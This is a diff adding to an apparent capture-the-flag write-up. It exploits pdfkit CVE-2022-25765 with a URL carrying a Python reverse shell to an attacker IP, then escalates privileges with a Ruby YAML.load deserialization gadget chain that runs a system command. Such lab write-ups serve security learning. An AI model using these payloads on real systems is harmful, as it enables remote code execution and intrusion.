@@ -152,13 +152,85 @@ how it looks:
 ![image](https://user-images.githubusercontent.com/99322823/224413307-d011c401-5923-47c2-9f45-ebf20a1af275.png)
 
 nothing out of the norm
-let's examine   it with `exiftool`:
+
+let's examine the metadata with `exiftool`:
 
 ![image](https://user-images.githubusercontent.com/99322823/224216511-f91436b8-5f29-432e-90ee-e475fec1c342.png)
 
- we find it's created with pdfkit
+what's interesting to us here is it's made with pdfkit
 googling 'pdfkit v0.8.6 exploit' we find CVE-2022-25765 whcih basically
 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 
+our payload:
+```
+http://10.10.14.222:8000/?name={'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.222",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`'}
+```
+
+# Gaining Access
+
+![image](https://user-images.githubusercontent.com/99322823/224590015-16362ac1-2df3-4207-bd76-a63419184b3d.png)
+
+the flag is in henry's home directory 
+
+![image](https://user-images.githubusercontent.com/99322823/224590553-9b0fe4e1-e91d-422c-8c8b-0a88e586ffdf.png)
+
+we can't acces it as ruby 
+
+![image](https://user-images.githubusercontent.com/99322823/224590855-1fb9ca99-4be9-415f-a654-a7cc561736be.png)
+
+try ssh-ing into henry's
+
+![image](https://user-images.githubusercontent.com/99322823/224591089-aa47e96b-e2fe-43e2-83ba-b0aa4e06e18b.png)
 
 
+and we're in as henry !
+try to cat user.txt again and i
+
+![image](https://user-images.githubusercontent.com/99322823/224591640-8315ab37-3b4c-4c46-9c4c-dbac613531dc.png)
+
+we got our first flag !
+
+# Priv Escalation
+
+`sudo -l`
+
+![image](https://user-images.githubusercontent.com/99322823/224591737-1fe00cf7-55f9-4c82-a09b-a9f7b511eca3.png)
+
+
+![image](https://user-images.githubusercontent.com/99322823/224592218-2942f845-5fb6-4ca5-a514-0693af09a02f.png)
+
+
+![image](https://user-images.githubusercontent.com/99322823/224594774-224f228b-4b3e-486e-aeba-998605151d87.png)
+
+![image](https://user-images.githubusercontent.com/99322823/224594848-1520b416-aba6-439e-a8b6-2fccee89da7d.png)
+
+so it turned it's really using ruby
+googling : **yaml.load exploit ruby**
+
+![image](https://user-images.githubusercontent.com/99322823/224598469-c35034cc-5570-4fe0-9437-88f2a82d3ee0.png)
+
+
+we find a repo with a payload exploiting the `yaml.load` function [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)
+
+
+```
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
